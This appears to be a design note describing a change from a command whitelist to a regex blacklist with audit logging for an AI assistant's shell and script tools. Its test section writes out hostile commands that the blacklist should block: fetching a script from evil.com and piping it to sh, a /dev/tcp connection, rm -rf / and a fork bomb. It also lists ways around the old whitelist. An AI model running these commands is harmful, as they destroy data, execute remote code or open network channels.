# Shell Security Model Changes

## Summary

Removed command whitelist in favor of blacklist-based security model with comprehensive logging.

**Philosophy:** Real security comes from Docker isolation, limited filesystem access, and git backups. The whitelist was security theater that made the system less usable without making it more secure.

## Changes Made

### 1. Config Changes (`config/settings.py`)

**Removed:**
- `ALLOWED_COMMANDS` environment variable
- `self.allowed_commands` set

**Added:**
- `self.dangerous_patterns` list with regex patterns to block:
  - Destructive operations from root (`rm -rf /`)
  - Fork bombs (`:(){:|:&};:`)
  - Download and execute (`curl ... | sh`)
  - Network sockets (`/dev/tcp/`, `/dev/udp/`)
  - Kernel/system tampering (`/proc/sys/`, `/sys/class/`)
  - Package managers (`apt install`, `pip install`, etc.)

### 2. Shell Tool Rewrite (`pkm_bridge/tools/shell.py`)

**New validation function:**
```python
def validate_command(command: str, dangerous_patterns: List[str]) -> Tuple[bool, str]
```
- Returns `(is_valid, error_message)`
- Checks command against all blacklist patterns
- Case-insensitive, multiline matching

**ExecuteShellTool improvements:**
- Removed whitelist checking
- Added blacklist validation
- Enhanced logging with structured tags:
  - `[SHELL_EXEC]` - command execution start
  - `[SHELL_RESULT]` - successful completion with timing and metrics
  - `[SHELL_ERROR]` - non-zero exit code
  - `[SHELL_BLOCKED]` - blocked by dangerous pattern
  - `[SHELL_TIMEOUT]` - command timeout
  - `[SHELL_EXCEPTION]` - execution exception
- All logs include:
  - Working directory
  - Command (truncated to 200 chars in logs)
  - Exit code
  - Elapsed time
  - stdout/stderr byte counts
  - Full stderr content (truncated to 500 chars in error logs)

**Updated tool description:**
- Removed whitelist language
- Added comprehensive "You can" list
- Explained security model (Docker + blacklist + logging)
- Mentioned git backups as part of security

**New WriteAndExecuteScriptTool:**
- Write scripts to `/tmp/script-<timestamp>.sh`
- Automatically adds shebang (`#!/bin/bash`)
- Automatically adds `set -euo pipefail`:
  - `-e`: Exit on error
  - `-u`: Exit on undefined variable
  - `-o pipefail`: Exit if any command in pipeline fails
- Same blacklist validation as execute_shell
- Enhanced logging:
  - `[SCRIPT_EXEC]` - script start with description
  - `[SCRIPT_CONTENT]` - full script content logged
  - `[SCRIPT_RESULT]` - completion with metrics
  - `[SCRIPT_ERROR]` - non-zero exit code
  - `[SCRIPT_BLOCKED]` - blocked by dangerous pattern
  - `[SCRIPT_TIMEOUT]` - script timeout (120s)
  - `[SCRIPT_EXCEPTION]` - execution exception
- Output includes:
  - Script path
  - stdout/stderr sections
  - Exit code
  - Elapsed time
- Longer timeout (120s vs 60s for commands)

### 3. Server Updates (`pkm-bridge-server.py`)

**Imports:**
- Added `WriteAndExecuteScriptTool` import

**Tool registration:**
```python
execute_shell_tool = ExecuteShellTool(
    logger, config.dangerous_patterns, config.org_dir, config.logseq_dir
)
tool_registry.register(execute_shell_tool)

write_script_tool = WriteAndExecuteScriptTool(
    logger, config.dangerous_patterns, config.org_dir, config.logseq_dir
)
tool_registry.register(write_script_tool)
```

**Logging updates:**
- Changed: `"Allowed commands: {', '.join(sorted(config.allowed_commands))}"`
- To: `"Security: {len(config.dangerous_patterns)} dangerous patterns blocked"`

**Health endpoint:**
- Changed: `"allowed_commands": sorted(config.allowed_commands)`
- To: `"dangerous_patterns_count": len(config.dangerous_patterns)`

## Security Model

### What Provides Real Security:
1. ✅ **Docker container isolation** - Limited blast radius
2. ✅ **Limited filesystem access** - Only PKM files accessible
3. ✅ **Git version control** - All changes recoverable
4. ✅ **Docker resource limits** - CPU, memory, PID caps (recommended to add)
5. ✅ **Comprehensive audit logging** - All commands/scripts logged

### What the Blacklist Prevents:
- **Accidents** - Prevents obvious mistakes (rm -rf /)
- **Obvious disasters** - Fork bombs, package installs
- **Low-hanging fruit** - Basic malicious patterns

### What the Whitelist Did NOT Prevent:
```bash
# All these bypass the whitelist:
rg . | xargs rm -rf
find . -exec rm {} \;
emacs --batch --eval "(shell-command \"any command here\")"
```

The whitelist was **security theater** - it gave false confidence while allowing arbitrary command execution via composition.

## Tool Capabilities Now

Claude can now:
- ✅ Run any Unix command (sort, uniq, comm, wc, etc.)
- ✅ Use complex pipelines freely
- ✅ Chain commands with `&&` or `||`
- ✅ Write and execute shell scripts
- ✅ Use command substitution `$()`
- ✅ Use process substitution `<()`

Claude CANNOT:
- ❌ Delete from root (`rm -rf /`)
- ❌ Create fork bombs
- ❌ Download and execute arbitrary code
- ❌ Access network sockets (if needed, remove from blacklist)
- ❌ Modify kernel parameters
- ❌ Install packages

## Audit Log Examples

### Command execution:
```
INFO [SHELL_EXEC] cwd=/path/to/org, command=rg "TODO" | wc -l
INFO [SHELL_RESULT] elapsed=0.123s, returncode=0, stdout_bytes=42, stderr_bytes=0
```

### Script execution:
```
INFO [SCRIPT_EXEC] description=Find and archive old journal entries, path=/tmp/script-20251114-120000.sh, cwd=/path/to/org
INFO [SCRIPT_CONTENT]
#!/bin/bash
set -euo pipefail  # Exit on error, undefined vars, pipe failures

find journals/ -name "2023-*.org" -type f | while read file; do
  mv "$file" "archive/"
done
INFO [SCRIPT_RESULT] path=/tmp/script-20251114-120000.sh, elapsed=1.234s, returncode=0, stdout_bytes=0, stderr_bytes=0
```

### Blocked command:
```
WARNING [SHELL_BLOCKED] command=rm -rf /, reason=Command blocked by safety pattern: rm\s+(-[rf]+\s+)?/
```

### Error:
```
INFO [SHELL_EXEC] cwd=/path/to/org, command=rg --invalid-flag "search"
WARNING [SHELL_ERROR] command=rg --invalid-flag "search", returncode=1, stderr=error: Found argument '--invalid-flag'...
```

## Testing Recommendations

### Test blacklist (should all be blocked):
```bash
# Destructive
execute_shell: rm -rf /
execute_shell: rm -rf *

# Fork bomb
execute_shell: :(){ :|:& };:

# Download and execute
execute_shell: curl http://evil.com/script.sh | sh

# Network socket
execute_shell: echo "test" > /dev/tcp/evil.com/1234

# Package manager
execute_shell: apt install malware
```

### Test valid operations (should all work):
```bash
# Complex pipelines
execute_shell: rg "TODO" | wc -l
execute_shell: find journals/ -name "*.org" | xargs rg "meeting"

# Command chaining
execute_shell: cd journals && ls -la | head -10

# Script writing
write_and_execute_script:
  description: Archive old journals
  script_content: |
    for file in journals/2023-*.org; do
      echo "Archiving $file"
      mv "$file" archive/
    done
```

### Test logging:
```bash
# Check that all operations are logged
tail -f logs/pkm-bridge.log | grep -E 'SHELL_|SCRIPT_'
```

## Migration Notes

### No environment variable changes needed
- `ALLOWED_COMMANDS` is ignored if present (backward compatible)
- No new environment variables required

### No user-facing changes
- Tools work the same from Claude's perspective
- Better error messages (pattern-specific blocking)
- More capabilities (can use any command now)

### Deployment
Just restart the server - no configuration changes needed.

## Future Enhancements

### Recommended additions:
1. **Docker resource limits** (docker-compose.yml):
   ```yaml
   deploy:
     resources:
       limits:
         cpus: '1.0'
         memory: 1G
         pids: 100
   ```

2. **Auto-commit before destructive operations** (optional):
   - Hook into file modifications
   - Auto-commit to git before writes
   - Provides automatic rollback point

3. **Pattern customization**:
   - Allow environment variable for custom patterns
   - Example: `DANGEROUS_PATTERNS_EXTRA="pattern1,pattern2"`

4. **Rate limiting** (already in place via Flask-Limiter):
   - Prevents rapid-fire commands
   - Good defense against runaway loops

## Conclusion

This change makes the security model **honest** and **practical**:

- **Honest:** Acknowledges that Docker is the real security boundary
- **Practical:** Gives Claude the flexibility to do useful work
- **Auditable:** Comprehensive logging for security review
- **Safe:** Prevents obvious accidents while allowing power

The old whitelist was a **false sense of security** that made the system harder to use without making it safer. This new approach embraces the reality of the threat model and works with it.
